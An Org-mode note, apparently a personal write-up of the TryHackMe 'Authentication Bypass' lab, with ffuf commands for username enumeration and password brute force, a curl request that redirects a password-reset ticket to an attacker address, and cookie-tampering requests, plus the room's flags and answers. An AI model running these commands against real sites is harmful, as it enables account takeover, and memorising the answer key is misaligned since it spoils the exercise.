@@ -1,0 +1,119 @@
+#+title:      Authentication Bypass
+#+date:       [2022-09-19 Mon 08:54]
+#+filetags:   :room:tryhackme:
+#+identifier: 20220919T085441
+
+* Link to the room
+[[https://tryhackme.com/room/authenticationbypass][authenticationbypass]]
+* Brief
+No answer needed.
+* Username Enumeration
+Website error message are greate resources for collect a list of valid username.
+The [[http://machine-ip/customers/signup][signup page]] of the ACME IT support site can tell us if a username is valid or not,
+i.e. try to signup with an already existing account, like ~admin~, the page will respond ~An account with this username already exists~.
+With [[denote:20220915T155935][ffuf]] it's possible to brute force a list of valid username.
+#+begin_src shell
+user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.56/customers/signup -mr "username already exists"
+#+end_src
+I get the following entries:
+#+begin_src ascii
+admin
+robert
+simon
+steve
+#+end_src
+** Answer 1
+What is the username starting with si*** ? #+begin_quote
+simon
+#+end_quote
+** Answer 2
+What is the username starting with st*** ?
+#+begin_quote
+steve
+#+end_quote
+** Answer 3
+What is the username starting with ro**** ?
+#+begin_quote
+robert
+#+end_quote
+* Brute Force
+Using the list of user of the previous section we can try to brute force the [[http://machine-ip/customers/login][login]] of the ACME IT website.
+With [[denote:20220915T155935][ffuf]] it's possible to brute force the login, before running the command I putted the username into a file.
+#+begin_src shell
+user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.56/customers/login -fc 200
+#+end_src
+The only match is
+#+begin_quote
+Steve,thunder
+#+end_quote
+** Answer 1
+What is the valid username and password (format: username/password)?
+#+begin_quote
+steve/thunder
+#+end_quote
+* Logical Flaw
+We are going to exploit the [[http://10.10.47.56/customers/reset][reset page]], using [[denote:20220915T161056][curl]].
+#+begin_src shell
+user@tryhackme$ curl 'http://10.10.47.56/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+#+end_src
+Adding ~&email=not-email-robert-email~ we can manipulate were the ticket is sended, remember that PHP give more precedece at the requests field, furthermore we have seen in the previous room (on this path) that the website is using PHP.
+#+begin_src shell
+user@tryhackme$ curl 'http://10.10.47.56/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=not-robert-email@hacker.com'
+#+end_src
+Flag:
+#+begin_quote
+THM{AUTH_BYPASS_COMPLETE}
+#+end_quote
+** Answer 1
+What is the flag from Robert's support ticket?
+#+begin_quote
+THM{AUTH_BYPASS_COMPLETE}
+#+end_quote
+* Cookie Tampering
+Examining cookie on the session can have multiple outcome.
+** Curl request 1
+#+begin_src shell
+curl http://10.10.47.56/cookie-test
+#+end_src
+*** Result
+#+begin_quote
+Not Logged In
+#+end_quote
+** Curl request 2
+#+begin_src shell
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.47.56/cookie-test
+#+end_src
+*** Result
+#+begin_quote
+Logged In As A User
+#+end_quote
+** Curl request 3
+#+begin_src shell
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.47.56/cookie-test
+#+end_src
+*** Result
+#+begin_quote
+Logged In As A Admin - THM{COOKIE_TAMPERING}
+#+end_quote
+** Hashing
+Sometimes the cookie can be hashed, in this case we can use [[denote:20220919T095455][crackstation]].
+** Answer 1
+What is the flag from changing the plain text cookie values?
+#+begin_quote
+THM{COOKIE_TAMPERING}
+#+end_quote
+** Answer 2
+What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
+#+begin_quote
+463729
+#+end_quote
+** Answer 3
+What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
+#+begin_quote
+THM{BASE64_ENCODING}
+#+end_quote
+** Answer 4
+Encode the following value using base64 {"id":1,"admin":true}
+#+begin_quote
+eyJpZCI6MSwiYWRtaW4iOnRydWV9
+#+end_quote
